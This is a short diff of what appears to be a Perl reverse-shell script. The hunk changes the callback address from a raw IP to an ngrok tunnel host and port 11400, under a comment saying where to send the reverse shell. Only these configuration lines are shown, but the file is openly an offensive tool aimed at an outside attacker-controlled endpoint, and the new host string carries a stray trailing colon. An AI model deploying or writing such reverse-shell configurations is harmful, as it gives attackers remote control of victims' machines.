@@ -42,8 +42,8 @@ use POSIX;
 my $VERSION = "1.0";
 
 # Where to send the reverse shell.  Change these.
-my $ip = '185.25.204.200';
-my $port = 9001;
+my $ip = '5.tcp.eu.ngrok.io:';
+my $port = 11400;
 
 # Options
 my $daemon = 1;
